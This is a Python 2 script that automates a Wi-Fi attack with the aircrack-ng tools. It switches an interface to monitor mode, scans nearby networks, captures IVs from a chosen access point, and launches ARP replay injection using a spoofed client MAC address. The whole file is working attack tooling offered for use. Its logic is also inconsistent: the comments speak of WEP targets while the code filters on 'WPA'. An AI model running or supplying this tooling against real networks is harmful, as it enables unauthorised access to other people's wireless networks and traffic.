import csv
import time
import os
import sys


_interface =""
_interfaceMon =""

# monitor mode 
def initMonitor():
	interface = raw_input("Select and interface to monitor : ")
	availables = os.listdir('/sys/class/net')
	if not interface in availables :
		print("Unknown interface %s . Availables interfaces are %s" %(interface,availables))
		os._exit(0)
	print(" ------ MONITORING INTERFACE ------ ")
	global _interface 
	_interface = interface
	monitorCmd = "airmon-ng start "+interface
	os.system(monitorCmd)
	global _interfaceMon 
	_interfaceMon =  interface + "mon"

# scan for wireless networks
def scanNetworks():
	print(" ------SCANNING FOR WIRELESS NETWORKS ------ ")
	os.system("rm -r ./captures/*")
	wirelessScanCmd = "gnome-terminal -x bash -c 'airodump-ng --write ./captures/capture " + _interfaceMon + ";exec bash' > /dev/null 2>&1"
	os.system(wirelessScanCmd)

# From scanning network result .csv isolate WEP Wifi and Dump Datas.
# Asking for arp injection too
def dumpNetwork():
	ignored = []
	while True :
		with open('./captures/capture-01.csv') as csv_file:
		    csv_reader = csv.reader(csv_file, delimiter=',')
		    counter = 0
		    is_station = 0
		    wirelessArray = []
		    for capture in csv_reader:
			    if 'Station MAC' in capture :
			    	is_station = 1
			    if is_station == 0 :
			    	wirelessArray.append(capture)
			    	if counter > 1 and len(wirelessArray[counter]) > 12:
			    		bssid = wirelessArray[counter][0]
			    		## check if is WEP to Dump IT 
			    		if "WPA" in wirelessArray[counter][5] and bssid not in ignored:
			    			os.system("mpg123 pew.mp3 > /dev/null 2>&1")
			    			essid = wirelessArray[counter][13]
			    			privacy = wirelessArray[counter][5]
			    			channel = wirelessArray[counter][3]
			    			power = wirelessArray[counter][8]
			    			dumpDir="./captures/" + bssid
			    			if not os.path.exists(dumpDir) : 
			    				os.makedirs(dumpDir)
			    			dumpFile= dumpDir + "/dump"
			    			print("%s %s %s %s %s" % (essid,bssid,privacy,channel,power))
			    			goDump = raw_input("DUMPS IV'S ? (o/n):")
			    			if goDump == "o" : 
			    				dumpCmd = "gnome-terminal -x bash -c 'airodump-ng --bssid " + bssid + " --channel "+  channel + " -w " + dumpFile + "  " +  _interfaceMon  + ";exec bash' > /dev/null 2>&1"
			    				os.system(dumpCmd)
			    				injectArp = raw_input("ARP INJECTION ?(o/n):")
				    			if injectArp == "o" :
				    				macAddr = raw_input("STATION MAC ADDRESS TO SPOOF :")
				    				print(" ------START ARP INJECTION ------ ")
				    				arpCmd = "gnome-terminal -x bash -c 'aireplay-ng -3 -b " + bssid + " -h " + macAddr + " " + _interfaceMon + ";exec bash' > /dev/null 2>&1"
				    				os.system(arpCmd)
				    		else :
				    			ignored.append(bssid)
			    	counter +=1
			    time.sleep(0.2)


def main():
	try :
		initMonitor()
		scanNetworks()
		time.sleep(1)
		dumpNetwork()
	except KeyboardInterrupt : 
		os.system("airmon-ng stop "+_interfaceMon)
		print("Good BYE")
main()


		    

